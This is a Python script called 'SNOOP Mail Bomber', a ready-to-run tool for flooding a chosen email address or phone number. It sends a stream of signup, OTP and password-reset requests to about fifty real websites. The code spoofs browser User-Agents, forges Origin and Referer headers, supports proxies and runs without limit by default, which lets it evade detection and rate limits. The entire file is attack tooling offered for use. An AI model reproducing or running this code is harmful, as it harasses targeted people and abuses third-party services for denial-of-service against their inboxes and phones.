#!/usr/bin/env python3
# SNOOP Mail Bomber – Email bombing via free APIs

import asyncio, aiohttp, random, string, json, sys
from urllib.parse import urlparse
from colorama import Fore, Style, init
init(autoreset=True)

def generate_dynamic_ua():
    platforms = ['Windows', 'Android', 'iOS']
    platform = random.choice(platforms)
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    webkit_v = "537.36"
    if platform == 'Windows':
        win_v = random.choice(['10.0', '11.0'])
        return f"Mozilla/5.0 (Windows NT {win_v}; Win64; x64) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    elif platform == 'Android':
        android_v = random.randint(13, 15)
        model = random.choice(['SM-S938B', 'Pixel 9 Pro XL', 'Xiaomi 15 Pro'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}"
    else:
        ios_v = random.choice(['17_4_1', '18_1', '18_2'])
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_v.replace('_', '.')} Mobile/15E148 Safari/604.1"

class AsyncEmailBomber:
    def __init__(self, target, limit=0, concurrency=20, proxy=None):
        self.target = target
        self.limit = limit
        self.concurrency = concurrency
        self.proxy = proxy
        self.sent = 0
        self.failed = 0
        self.running = False
        self.semaphore = asyncio.Semaphore(concurrency)
        self.session = None

        self.apis = [
            ("Bisleri OTP", "https://apis.bisleri.com/send-otp", "POST", "json", {"email": "{target}", "mobile": "9999999999"}),
            ("Moglix OTP", "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "POST", "json", {"email": "{target}", "phone": "9999999999", "type": "p", "source": "signup"}),
            ("Bikroy Account", "https://bikroy.com/data/account", "POST", "json", {"account":{"profile":{"name":"{rand}","opt_out":False},"login":{"email":"{target}","password":"Password123"}}}),
            ("Bikroy Reset", "https://bikroy.com/data/password_resets", "POST", "json", {"email": "{target}"}),
            ("Busbud Signup", "https://www.busbud.com/auth/email-signup", "POST", "json", {"first_name":"User","last_name":"Navi","email":"{target}","password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}),
            ("Mithaibd Register", "https://mithaibd.com/", "POST", "data", "phone={target}"),
            ("Sara Reset", "https://prod.saralifestyle.com/api/Master/SendTokenV1", "POST", "json", {"userContactNo":"{target}","userType":"customer","actionFor":"r"}),
            ("Tohfay Register", "https://www.tohfay.com/user/register.html", "POST", "data", "phone={target}"),
            ("Tohfay Forgot", "https://www.tohfay.com/forgot-password.html", "POST", "data", "phone={target}"),
            ("MrMedicineMart Signup", "https://www.mrmedicinemart.com/web/signup", "POST", "data", "phone={target}"),
            ("MrMedicineMart Reset", "https://www.mrmedicinemart.com/web/reset_password", "POST", "data", "phone={target}"),
            ("Robishop Create", "https://api.robishop.com.bd/api/user/create", "POST", "json", {"customer":{"email":"{target}","firstname":"{rand}","lastname":"{rand}","custom_attributes":{"mobilenumber":"01711111111"}},"password":"Password123"}),
            ("Robishop Reset", "https://api.robishop.com.bd/api/user/reset-password", "POST", "json", {"email": "{target}"}),
            ("SingerBD OTP", "https://www.singerbd.com/api/auth/otp/login", "POST", "json", {"login":"{target}"}),
            ("Potakait Register", "https://potakait.com/account/register", "POST", "data", "phone={target}"),
            ("ElectronicsBD Reg", "https://www.electronics.com.bd/registration", "POST", "data", "phone={target}"),
            ("GlobalBrand Reg", "https://www.globalbrand.com.bd/index?route=account/register", "POST", "data", "phone={target}"),
            ("GlobalBrand Forgot", "https://www.globalbrand.com.bd/index?route=account/forgotten", "POST", "data", "phone={target}"),
            ("Zymak Register", "https://www.zymak.com.bd/my-account/", "POST", "data", "phone={target}"),
            ("Shopz Register", "https://www.shopz.com.bd/my-account/?action=register", "POST", "data", "phone={target}"),
            ("GamebuyBD Reg", "https://gamebuybd.com/my-account/", "POST", "data", "phone={target}"),
            ("Gameforce Reg", "https://gameforce.pk/my-account/?action=register", "POST", "data", "phone={target}"),
            ("GamecastleBD Reg", "https://gamecastlebd.com/my-account/", "POST", "data", "phone={target}"),
            ("TechshopBD Signup", "https://techshopbd.com/sign-in", "POST", "data", "phone={target}"),
            ("ElectronicShopBD Reg", "https://electronicshopbd.com/wp-admin/admin-ajax", "POST", "data", "phone={target}"),
            ("MakersBD Register", "https://www.makersbd.com/customer/store", "POST", "json", {"phone": "{target}"}),
            ("ABE Register", "https://abe.com.bd/customer-register", "POST", "data", "phone={target}"),
            ("ColorCrazeBD Signup", "https://www.colorcrazebd.com/web/signup", "POST", "data", "phone={target}"),
            ("Smartview Register", "https://smartview.com.bd/register", "POST", "json", {"phone": "{target}"}),
            ("Shikho Email OTP", "https://api.shikho.com/v1/auth/send-otp", "POST", "json", {"email": "{target}", "type": "registration"}),
            ("ClickBD Signup", "https://www.clickbd.com/login/signup/", "POST", "data", "email={target}"),
            ("Diamu Register", "https://diamu.com.bd/my-account/", "POST", "data", "email={target}"),
            ("BDManja Register", "https://bdmanja.com/my-account/", "POST", "data", "email={target}"),
            ("GameGhor Register", "https://www.gameghor.com/my-account-2/", "POST", "data", "email={target}"),
            ("NurTelecom Register", "https://nurtelecom.com.bd/my-account/?action=register", "POST", "data", "email={target}"),
            ("Orient Electronics Reg", "https://orient-electronics.com/my-account?action=register", "POST", "data", "email={target}"),
            ("Quora Signup", "https://www.quora.com/api/signup", "POST", "json", {"email": "{target}"}),
            ("Pinterest Signup", "https://www.pinterest.com/api/signup", "POST", "json", {"email": "{target}"}),
            ("Daraz Reg", "https://member.daraz.com.bd/user/api/sendOtp", "POST", "json", {"email": "{target}"}),
            ("Chaldal Reg", "https://chaldal.com/api/customer/SendOTP", "POST", "json", {"email": "{target}"}),
            ("Pathao Reg", "https://api.pathao.com/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("Shohoz Reg", "https://www.shohoz.com/api/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("Foodpanda Reg", "https://www.foodpanda.com.bd/api/v1/otp/send", "POST", "json", {"email": "{target}"}),
            ("Rokomari Reg", "https://www.rokomari.com/api/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("Evaly Reg", "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("AmarPay Reg", "https://api.amarpay.com/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("Pickaboo Reg", "https://api.pickaboo.com/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("AjkerDeal Reg", "https://api.ajkerdeal.com/v1/auth/otp/send", "POST", "json", {"email": "{target}"}),
            ("PriyoShop Reg", "https://api.priyoshop.com/v1/auth/otp/send", "POST", "json", {"email": "{target}"})
        ]

    def _get_headers(self, url):
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        return {
            "User-Agent": generate_dynamic_ua(),
            "Accept": "application/json, text/plain, */*",
            "Origin": origin,
            "Referer": origin + "/",
            "X-Requested-With": "XMLHttpRequest"
        }

    async def _send(self, name, url, method, p_type, p_temp):
        async with self.semaphore:
            if not self.running: return
            try:
                target = self.target
                headers = self._get_headers(url)
                if p_type == "json":
                    payload = json.loads(json.dumps(p_temp).replace("{target}", target).replace("{rand}", ''.join(random.choices(string.ascii_lowercase, k=8))))
                elif p_type == "data":
                    payload = p_temp.replace("{target}", target)
                else:
                    payload = None
                async with self.session.post(url, json=payload if p_type == "json" else None, data=payload if p_type == "data" else None, headers=headers, proxy=self.proxy, timeout=15) as res:
                    success = res.status in [200, 201]
                if success:
                    self.sent += 1
                    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Sent via {name}")
                else:
                    self.failed += 1
            except Exception:
                self.failed += 1

    async def start(self):
        self.running = True
        async with aiohttp.ClientSession() as session:
            self.session = session
            tasks = []
            while self.running:
                if self.limit > 0 and self.sent >= self.limit: break
                api = random.choice(self.apis)
                tasks.append(asyncio.create_task(self._send(*api)))
                await asyncio.sleep(0.05)
                tasks = [t for t in tasks if not t.done()]
                if len(tasks) > self.concurrency * 2:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)

def main():
    print(f"{Fore.MAGENTA}\n  ╔═══════════════════════════════════════╗")
    print(f"  ║         SNOOP MAIL BOMBER              ║")
    print(f"  ╚═══════════════════════════════════════╝\n{Style.RESET_ALL}")
    target = input(f"{Fore.CYAN}  Target Email: {Style.RESET_ALL}").strip()
    if not target or '@' not in target:
        print(f"{Fore.RED}  [!] Invalid email.{Style.RESET_ALL}")
        input("  Press Enter...")
        return
    try:
        count = int(input(f"{Fore.CYAN}  Number of messages (0 = unlimited): {Style.RESET_ALL}").strip() or 0)
    except:
        count = 0
    try:
        concurrency = int(input(f"{Fore.CYAN}  Concurrency (20): {Style.RESET_ALL}").strip() or 20)
    except:
        concurrency = 20
    print(f"{Fore.GREEN}  [*] Starting bombing {target}... (Ctrl+C to stop){Style.RESET_ALL}\n")
    bomber = AsyncEmailBomber(target, limit=count, concurrency=concurrency)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(bomber.start())
    except KeyboardInterrupt:
        bomber.running = False
    finally:
        print(f"\n{Fore.YELLOW}  [>] Sent: {bomber.sent} | Failed: {bomber.failed}{Style.RESET_ALL}")
        loop.close()
    input(f"{Fore.CYAN}  Press Enter to return...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()